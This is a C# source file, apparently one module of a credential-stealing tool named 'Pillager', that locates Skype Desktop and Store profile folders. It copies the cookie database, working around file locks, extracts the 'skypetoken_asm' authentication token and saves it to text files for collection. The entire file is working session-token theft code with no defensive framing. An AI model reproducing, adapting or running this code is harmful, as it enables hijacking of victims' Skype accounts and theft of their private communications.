using Pillager.Helper;
using System;
using System.IO;
using System.Text;

namespace Pillager.IM
{
    internal class Skype
    {
        public static string IMName = "Skype";

        public static string[] IMPaths = new string[]
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft\\Skype for Desktop"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalCache\\Roaming\\Microsoft\\Skype for Store")
        };

        public static string Skype_cookies(string IMPath)
        {
            StringBuilder cookies = new StringBuilder();
            string skype_cookies_path = Path.Combine(IMPath, "Network\\Cookies");
            if (!File.Exists(skype_cookies_path)) return null;
            try
            {
                string cookie_tempFile = Path.GetTempFileName();
                try
                {
                    File.Copy(skype_cookies_path, cookie_tempFile, true);
                }
                catch
                {
                    byte[] ckfile = LockedFile.ReadLockedFile(skype_cookies_path);
                    if (ckfile != null) File.WriteAllBytes(cookie_tempFile, ckfile);
                }
                SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
                if (!handler.ReadTable("cookies")) return null;
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    string host_key = handler.GetValue(i, "host_key");
                    string name = handler.GetValue(i, "name");
                    string crypt = handler.GetValue(i, "value");
                    if (handler.GetValue(i, "name") == "skypetoken_asm")
                        cookies.AppendLine("{skypetoken}={" + handler.GetValue(i, "value") + "}");
                }
                File.Delete(cookie_tempFile);
            }
            catch { }
            return cookies.ToString();
        }

        public static void Save(string path)
        {
            try
            {
                if (!Directory.Exists(IMPaths[0]) && !Directory.Exists(IMPaths[1])) return;
                string savepath = Path.Combine(path, IMName);
                Directory.CreateDirectory(savepath);
                string Desktop = Skype_cookies(IMPaths[0]);
                string Store = Skype_cookies(IMPaths[1]);
                if (!String.IsNullOrEmpty(Desktop)) File.WriteAllText(Path.Combine(savepath, IMName + "_Desktop.txt"), Desktop);
                if (!String.IsNullOrEmpty(Store)) File.WriteAllText(Path.Combine(savepath, IMName + "_Store.txt"), Store);
            }
            catch { }
        }
    }
}
